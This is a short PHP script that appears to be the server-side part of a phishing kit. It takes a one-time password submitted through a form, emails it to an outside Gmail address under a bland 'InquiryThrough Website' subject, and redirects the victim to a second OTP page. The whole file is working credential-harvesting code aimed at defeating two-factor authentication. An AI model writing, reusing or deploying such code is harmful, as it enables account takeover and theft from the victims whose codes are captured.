<?php
 

   $OTP = $_POST["OTP"];
   
 
   $to = "saantosh87600@gmail.com";
   $subject="InquiryThrough Website";
   $msg = "OTP : ".$OTP."\n\n";
   $headers = "From: info@darkness-inc.online";
   
 


  if (mail($to, $subject, $msg, $headers)) {
	// echo "Thank you!...";
	header( "refresh:2; url=otp2.html" );
  } else {
	  echo "faild";
  }
   

?>
